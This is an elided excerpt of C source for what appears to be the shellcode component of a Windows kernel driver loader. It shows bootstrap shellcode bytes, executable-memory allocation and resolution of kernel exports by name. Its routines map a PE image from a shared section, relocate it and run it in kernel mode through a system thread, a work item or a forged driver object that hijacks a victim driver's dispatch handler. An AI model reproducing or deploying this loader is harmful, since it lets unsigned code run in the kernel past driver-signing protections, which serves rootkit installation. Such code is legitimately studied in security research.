...
#pragma pack(push, 1)
#define BOOTSTRAPCODE_SIZE_V1                                           \
    (SC_MAX_SIZE - SC_INIT_CODE_SIZE - sizeof(ULONG) - sizeof(SIZE_T) - \
     sizeof(PVOID) - sizeof(HANDLE) - sizeof(HANDLE) - sizeof(FUNC_TABLE))
...
C_ASSERT(FIELD_OFFSET(SHELLCODE, Tag) ==
         SC_INIT_CODE_SIZE + BOOTSTRAPCODE_SIZE_V1);
...
// 10 code
//
BYTE ScBootstrapLdr[] = {0xE8, 0x00, 0x00, 0x00, 0x00, 0x59,
                         0x48, 0x83, 0xE9, 0x05, 0xEB, 0x04};
...
// 10 code
//
BYTE ScBootstrapLdrCommon[] = {0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x58,
                               0x49, 0x83, 0xE8, 0x05, 0xEB, 0x03};
 ...
 */
FORCEINLINE
PIO_STACK_LOCATION IoGetCurrentIrpStackLocationTest(PIRP Irp) {
...
NTSTATUS NTAPI DriverEntryTest(_In_ struct _DRIVER_OBJECT* DriverObject,
...
VOID NTAPI ObMakeTemporaryObjectTest(PVOID Object) {
    UNREFERENCED_PARAMETER(Object);

    OutputDebugStringA("Inside ObMakeTemporaryObjectTest\r\n");
}

NTSTATUS NTAPI ZwMakeTemporaryObjectTest(HANDLE Handle) {
...
NTSTATUS NTAPI ObInsertObjectTest(PVOID Object,
...
NTSTATUS NTAPI ObCreateObjectTest(KPROCESSOR_MODE ProbeMode,
...
VOID NTAPI ExQueueWorkItemTest(PWORK_QUEUE_ITEM WorkItem,
...
PVOID NTAPI ExAllocatePoolWithTagTest(POOL_TYPE PoolType,
...
VOID NTAPI ExFreePoolTest(PVOID P) {
    OutputDebugStringA("Inside ExFreePoolTest\r\n");

    VirtualFree(P, 0, MEM_RELEASE);
}

VOID NTAPI ExFreePoolWithTagTest(PVOID P, ULONG Tag) {
    UNREFERENCED_PARAMETER(Tag);
...
PVOID NTAPI MmGetSystemRoutineAddressTest(PUNICODE_STRING SystemRoutineName) {
...
VOID IofCompleteRequestTest(VOID* Irp, CCHAR PriorityBoost) {
    UNREFERENCED_PARAMETER(Irp);
...
NTSTATUS NTAPI ZwCloseTest(HANDLE Handle) {
...
NTSTATUS NTAPI PsCreateSystemThreadTest(PHANDLE ThreadHandle,
                                        ULONG DesiredAccess,
                                        POBJECT_ATTRIBUTES ObjectAttributes,
...
NTSTATUS NTAPI KeSetEventTest(PKEVENT Event,
                              KPRIORITY Increment,
                              BOOLEAN Wait) {
...
NTSTATUS NTAPI ObReferenceObjectByHandleTest(HANDLE Handle,
                                             ACCESS_MASK DesiredAccess,
                                             POBJECT_TYPE ObjectType,
...
VOID NTAPI ObfDereferenceObjectTest(PVOID Object) {
    UNREFERENCED_PARAMETER(Object);
    OutputDebugStringA("Inside ObfDereferenceObjectTest\r\n");
}

ULONG NTAPI DbgPrintTest(PCHAR Format, ...) {
 ...
 * Read image from shared section, process relocs and run it in allocated system
 * thread.
 *
 * IRQL: PASSIVE_LEVEL
 *
 */
VOID NTAPI ScLoaderRoutineV1(_In_ PSHELLCODE ShellCode) {
    NTSTATUS status;
    ULONG isz;
    HANDLE hThread;
    ...
    status = ShellCode->Import.ObReferenceObjectByHandle(
        ShellCode->SectionHandle, SECTION_ALL_ACCESS,
        (ppSecType ? *ppSecType : NULL), 0, (PVOID*)&SectionRef, NULL);

    if (NT_SUCCESS(status)) {
        ViewSize = ShellCode->SectionViewSize;

        status = ShellCode->Import.ZwMapViewOfSection(
            ShellCode->SectionHandle, NtCurrentProcess(),
            (PVOID*)&pvSharedSection, 0, PAGE_SIZE, NULL, &ViewSize, ViewUnmap,
            0, PAGE_READWRITE);
        ...
        if (NT_SUCCESS(status)) {
            ...
            popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh +
            ...
            rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                NonPagedPool, isz + PAGE_SIZE, ShellCode->Tag);

            if (rawExAlloc) {
                exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) &
                           ~(PAGE_SIZE - 1);
                ...
                // Relocate image.
                //
                if (popth->NumberOfRvaAndSizes >
                    IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                    off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
                              .VirtualAddress;
                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
                              .Size;
                    if (off && rsz && off + rsz <= isz) {
                        rel = (PIMAGE_BASE_RELOCATION)(img + off);
                        c = 0;
                        while (c < rsz) {
                            chain = (LPWORD)((PUCHAR)rel +
                                             sizeof(IMAGE_BASE_RELOCATION));
                            for (off = sizeof(IMAGE_BASE_RELOCATION);
                                 off < rel->SizeOfBlock;
                                 off += sizeof(WORD), chain++) {
                                if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                    *(PULONG_PTR)(img + rel->VirtualAddress +
                                                  (*chain & 0x0FFF)) += delta;
                            }
                            c += rel->SizeOfBlock;
                            rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel +
                                                           rel->SizeOfBlock);
                        }
                    }
                }
                ...
                //
                // Copy image to allocated buffer. We can't use any fancy memcpy
                // stuff here.
                //
                ...
                //
                hThread = NULL;
                InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL,
                                           NULL);

                status = PayloadHeader->PsCreateSystemThread(
                    &hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
        ...
        //
        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->ReadyEventHandle, SYNCHRONIZE | EVENT_MODIFY_STATE, NULL,
            0, (PVOID*)&ReadyEvent, NULL);
        if (NT_SUCCESS(status)) {
 ...
 * Read image from shared section, process relocs, allocate driver object and
 * run driver entry point.
 *
 * N.B. This shellcode version is for a very specific use only. Refer to docs
 * for more info.
 *
 * IRQL: PASSIVE_LEVEL
 *
 */
NTSTATUS NTAPI ScDispatchRoutineV3(_In_ struct _DEVICE_OBJECT* DeviceObject,
    ...
    if ((StackLocation->MajorFunction == IRP_MJ_CREATE) &&
        ...
        if (NT_SUCCESS(status)) {
            ...
            status = ShellCode->Import.ZwMapViewOfSection(
                ShellCode->SectionHandle, NtCurrentProcess(),
                (PVOID*)&pvSharedSection, 0, PAGE_SIZE, NULL, &ViewSize,
            ...
            if (NT_SUCCESS(status)) {
                ...
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh =
                    (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh +
                                                 sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;
                ...
                if (rawExAlloc) {
                    ...
                    if (popth->NumberOfRvaAndSizes >
                        ...
                        if (off && rsz && off + rsz <= isz) {
                            ...
                            while (c < rsz) {
                                ...
                                c += rel->SizeOfBlock;
                                rel =
                                    (PIMAGE_BASE_RELOCATION)((PUCHAR)rel +
                                                             rel->SizeOfBlock);
                            }
                        }
                    }
                    ...
                    //
                    // Copy image to allocated buffer. We can't use any fancy
                    // memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Remember Victim IRP_MJ_PNP as invalid device request
                    // handler.
                    //
                    IopInvalidDeviceIoControl =
                        DeviceObject->DriverObject->MajorFunction[IRP_MJ_PNP];

                    driverName.Buffer = PayloadHeader->ObjectName.Buffer;
                    driverName.Length = PayloadHeader->ObjectName.Length;
                    driverName.MaximumLength =
                        PayloadHeader->ObjectName.MaximumLength;

                    InitializeObjectAttributes(
                        &objectAttributes, &driverName,
                        OBJ_PERMANENT | OBJ_CASE_INSENSITIVE, NULL, NULL);

                    //
                    // We cannot use IoCreateDriver here as it supply
                    // DriverEntry with NULL as registry path.
                    //

                    //
                    // Calculate object body size, number of bytes used by
                    // ObManager in ExAllocate* call. Must include driver object
                    // body and real size of driver extension which tail is
                    // opaque and different on various versions of NT. Assume 40
                    // extra bytes (as on Win10) is currently enough.
                    //
                    // N.B. Correct this size according to future
                    // IopDeleteDriver changes.
                    //
                    objectSize =
                        sizeof(DRIVER_OBJECT) + sizeof(DRIVER_EXTENSION) + 40;

                    status = PayloadHeader->ObCreateObject(
                        KernelMode,
                        *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType,
                        &objectAttributes, KernelMode, NULL, objectSize, 0, 0,
                        (PVOID*)&driverObject);
                    ...
                    if (NT_SUCCESS(status)) {
                        ...
                        driverObject->DriverInit =
                            (PDRIVER_INITIALIZE)(exbuffer +
                                                 popth->AddressOfEntryPoint);

                        for (c = 0; c <= IRP_MJ_MAXIMUM_FUNCTION; c++)
                            driverObject->MajorFunction[c] =
                                IopInvalidDeviceIoControl;

                        //
                        // Allocate DriverExtension->ServiceKeyName. Failure is
                        // insignificant. In case of NULL ptr IopDeleteDriver
                        // will handle this correctly.
                        //
                        driverObject->DriverExtension->ServiceKeyName.Buffer =
                            (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(
                                PagedPool, driverName.Length + sizeof(WCHAR),
                                SHELL_POOL_TAG);
                        if (driverObject->DriverExtension->ServiceKeyName
                                .Buffer) {
                            driverObject->DriverExtension->ServiceKeyName
                                .MaximumLength = driverName.MaximumLength;
                            driverObject->DriverExtension->ServiceKeyName
                                .Length = driverName.Length;
                            __movsb((PUCHAR)driverObject->DriverExtension
                                        ->ServiceKeyName.Buffer,
                                    (UCHAR*)driverName.Buffer,
                                    driverName.Length);
                        }

                        status = PayloadHeader->ObInsertObject(
                            driverObject, 0, FILE_READ_ACCESS, 0, NULL,
                            &driverHandle);

                        if (NT_SUCCESS(status)) {
                            //
                            // Reference object so we can close driver handle
                            // without object going away.
                            //
                            status =
                                ShellCode->Import.ObReferenceObjectByHandle(
                                    driverHandle, 0,
                                    *(POBJECT_TYPE*)
                                         PayloadHeader->IoDriverObjectType,
                                    KernelMode, (PVOID*)&driverObject, NULL);
                            if (NT_SUCCESS(status)) {
                                PayloadHeader->ZwClose(driverHandle);

                                //
                                // Allocate DriverObject->DriverName. Failure is
                                // insignificant. In case of NULL ptr
                                // IopDeleteDriver will handle this correctly.
                                //
                                driverObject->DriverName.Buffer =
                                    (PWSTR)
                                        ShellCode->Import.ExAllocatePoolWithTag(
                                            PagedPool, driverName.MaximumLength,
                                            SHELL_POOL_TAG);
                                if (driverObject->DriverName.Buffer) {
                                    ...
                                    driverObject->DriverName.Length =
                                        driverName.Length;
                                    __movsb(
                                        (PUCHAR)driverObject->DriverName.Buffer,
                                        (UCHAR*)driverName.Buffer,
                                        driverName.Length);
                                }

                                regPath.Buffer =
                                    PayloadHeader->RegistryPath.Buffer;
                                regPath.Length =
                                    PayloadHeader->RegistryPath.Length;
                                regPath.MaximumLength =
                                    PayloadHeader->RegistryPath.MaximumLength;
...
#ifdef _DEBUG
                                status =
                                    DriverEntryTest(driverObject, &regPath);
#else
                                status = ((
                                    PDRIVER_INITIALIZE)(exbuffer +
                                                        popth
                                                            ->AddressOfEntryPoint))(
                                    driverObject, &regPath);
#endif

                                //
                                // Driver initialization failed, get rid of
                                // driver object.
                                //
                                if (!NT_SUCCESS(status)) {
                                    PayloadHeader->ObMakeTemporaryObject(
                                        driverObject);
                                    ShellCode->Import.ObfDereferenceObject(
                                        driverObject);
                                }
                                ...
                                //
                                PayloadHeader->ZwMakeTemporaryObject(
                                    driverHandle);
                                PayloadHeader->ZwClose(driverHandle);
                            }
...
#ifdef ENABLE_DBGPRINT
                        //
                        // ObInsertObject failed switch, on fail ObManager
                        // dereference newly created object automatically.
                        //
                        else {
                            //
            ...
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(
                ShellCode->ReadyEventHandle, SYNCHRONIZE | EVENT_MODIFY_STATE,
                NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status)) {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }
 ...
 *
 */
NTSTATUS NTAPI ScDispatchRoutineV2(_In_ struct _DEVICE_OBJECT* DeviceObject,
                                   _Inout_ struct _IRP* Irp,
                                   _In_ PSHELLCODE ShellCode) {
    NTSTATUS status;
    ULONG isz;
        ...
        if (NT_SUCCESS(status)) {
            ...
            if (NT_SUCCESS(status)) {
                ...
                if (rawExAlloc) {
                    ...
                    //
                    // Allocate worker and run image entry point within system
                    // worker thread.
                    //
                    WorkItem = (WORK_QUEUE_ITEM*)
                                   ShellCode->Import.ExAllocatePoolWithTag(
                                       NonPagedPool, sizeof(WORK_QUEUE_ITEM),
                                       ShellCode->Tag);
                    ...
                    if (WorkItem) {
                        ...
                        WorkItem->WorkerRoutine =
                            (PWORKER_THREAD_ROUTINE)(exbuffer +
                                                     popth
                                                         ->AddressOfEntryPoint);

                        PayloadHeader->ExQueueWorkItem(WorkItem,
                                                       DelayedWorkQueue);

                        //
                        // Save result.
                        //
                        PayloadHeader->IoStatus.Information =
                            (ULONG_PTR)WorkItem;
 ...
 *
 */
NTSTATUS NTAPI ScDispatchRoutineV1(_In_ struct _DEVICE_OBJECT* DeviceObject,
                                   _Inout_ struct _IRP* Irp,
                                   _In_ PSHELLCODE ShellCode) {
    NTSTATUS status;
    ULONG isz;
        ...
        if (NT_SUCCESS(status)) {
            ...
            if (NT_SUCCESS(status)) {
                ...
                if (rawExAlloc) {
                    ...
                    //
                    // Create system thread with handler set to image entry
                    // point.
                    //
                    hThread = NULL;
                    InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE,
                                               NULL, NULL);

                    status = PayloadHeader->PsCreateSystemThread(
                        &hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                        (PKSTART_ROUTINE)(exbuffer +
                                          popth->AddressOfEntryPoint),
                        NULL);
...
//
// In case if MSVC trashes shellcode and you turned off optimization re-enable
// it here #pragma optimize("", on )
//
 ...
 */
NTSTATUS NTAPI
ScDispatchRoutineDebugSelector(_In_ ULONG ScVersion,
                               _In_ PVOID ScBuffer,
                               _In_ struct _DEVICE_OBJECT* DeviceObject,
                               _Inout_ struct _IRP* Irp) {
    union {
 ...
 *
 */
BOOL ScBuildShellImportDebug(_In_ ULONG ScVersion, _In_ PVOID ScBuffer) {
 ...
 *
 */
BOOL ScBuildShellImport(_In_ ULONG ScVersion,
                        _In_ PVOID ScBuffer,
...
#pragma warning(pop)
        ...
        MmSectionObjectTypePtr = (PVOID)ScResolveFunctionByName(
            KernelBase, KernelImage, "MmSectionObjectType");
        ASSERT_RESOLVED_FUNC(MmSectionObjectTypePtr);

        ShellCode->MmSectionObjectType = MmSectionObjectTypePtr;

#ifdef ENABLE_DBGPRINT
        DbgPrintPtr = (pfnDbgPrint)ScResolveFunctionByName(
            KernelBase, KernelImage, "DbgPrint");
        ...
        for (i = 0; i < RTL_NUMBER_OF(funcNames); i++) {
            funcPtrs[i] = (PVOID)ScResolveFunctionByName(
                KernelBase, KernelImage, funcNames[i]);
...
BOOLEAN ScStoreVersionSpecificData(_In_ PKDU_CONTEXT Context,
    ...
    switch (Context->ShellVersion) {
        case KDU_SHELLCODE_V3:
            ...
            StringCchPrintf(drvName.Buffer, MAX_PATH, L"%ws%ws",
                            OB_DRIVER_PREFIX, Context->DriverObjectName.Buffer);
            ...
            RtlCopyMemory(&pvPayloadHead.Version.v3->ObjectName, &drvName,
                          sizeof(FIXED_UNICODE_STRING));

            if (Context->DriverRegistryPath.Length == 0) {
                //
                // Registry name not provided, assume it is the same as driver
                // object name.
                //
            ...
            StringCchPrintf(regPath.Buffer, MAX_PATH,
                            L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\S"
                            L"ervices\\%ws",
                            lpRegistryEntryName);
            ...
            RtlCopyMemory(&pvPayloadHead.Version.v3->RegistryPath, &regPath,
                          sizeof(FIXED_UNICODE_STRING));
 ...
 *
 */
BOOL ScBuildInitCodeForVersion(_In_ ULONG ShellVersion,
 ...
 * Purpose:
 *
 * Allocate main shellcode buffer in memory, setup init code and import which is
...
PVOID ScAllocate(_In_ ULONG ShellVersion,
    ...
    *ShellSize = 0;
    ...
    pvShellCode = (SHELLCODE*)supAllocateLockedMemory(
        scSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ...
    ScDispatchRoutineDebugSelector(ShellVersion, pvShellCode, &devObject,
                                   &tempIrp);
    ...
    if (!ScBuildShellImport(ShellVersion, pvShellCode, KernelBase,
                            KernelImage)) {
        ScFree(pvShellCode, scSize);
    ...
    __try {
        ...
        // supWriteBufferToFile((PWSTR)L"C:\\install\\out2.bin", pvBootstrap,
        // procSize, FALSE, FALSE, NULL);
 ...
 * Purpose:
 *
 * Create UNICODE_STRING with fixed maximum (FIXED_UNICODE_STRING_LENGTH) size
 * buffer.
 *
 */
...
BOOLEAN ScResolveImportForPayload(_In_ ULONG ShellVersion,
    ...
    switch (ShellVersion) {
        case KDU_SHELLCODE_V3:
...
#else
            IoDriverObjectTypePtr = (PVOID)ScResolveFunctionByName(
                KernelBase, KernelImage, "IoDriverObjectType");
            ASSERT_RESOLVED_FUNC_ABORT(IoDriverObjectTypePtr);

            ObCreateObjectPtr = (pfnObCreateObject)ScResolveFunctionByName(
                KernelBase, KernelImage, "ObCreateObject");
            ASSERT_RESOLVED_FUNC_ABORT(ObCreateObjectPtr);

            ObInsertObjectPtr = (pfnObInsertObject)ScResolveFunctionByName(
                KernelBase, KernelImage, "ObInsertObject");
            ASSERT_RESOLVED_FUNC_ABORT(ObInsertObjectPtr);

            ObMakeTemporaryObjectPtr =
                (pfnObMakeTemporaryObject)ScResolveFunctionByName(
                    KernelBase, KernelImage, "ObMakeTemporaryObject");
            ASSERT_RESOLVED_FUNC_ABORT(ObMakeTemporaryObjectPtr);

            ZwMakeTemporaryObjectPtr =
                (pfnZwMakeTemporaryObject)ScResolveFunctionByName(
                    KernelBase, KernelImage, "ZwMakeTemporaryObject");
            ASSERT_RESOLVED_FUNC_ABORT(ZwMakeTemporaryObjectPtr);

            ZwClosePtr = (pfnZwClose)ScResolveFunctionByName(
                KernelBase, KernelImage, "ZwClose");
            ASSERT_RESOLVED_FUNC_ABORT(ZwClosePtr);
#endif

            pvPayloadHead.Version.v3->IoDriverObjectType =
            ...
            pvPayloadHead.Version.v3->ObMakeTemporaryObject =
                ObMakeTemporaryObjectPtr;
            pvPayloadHead.Version.v3->ZwMakeTemporaryObject =
                ZwMakeTemporaryObjectPtr;
...
#else
            ExQueueWorkItemPtr = (pfnExQueueWorkItem)ScResolveFunctionByName(
                KernelBase, KernelImage, "ExQueueWorkItem");
        ...
        default:
            ...
            PsCreateSystemThreadPtr =
                (pfnPsCreateSystemThread)ScResolveFunctionByName(
                    KernelBase, KernelImage, "PsCreateSystemThread");
            ASSERT_RESOLVED_FUNC_ABORT(PsCreateSystemThreadPtr);
#endif

            pvPayloadHead.Version.v1->PsCreateSystemThread =
                PsCreateSystemThreadPtr;
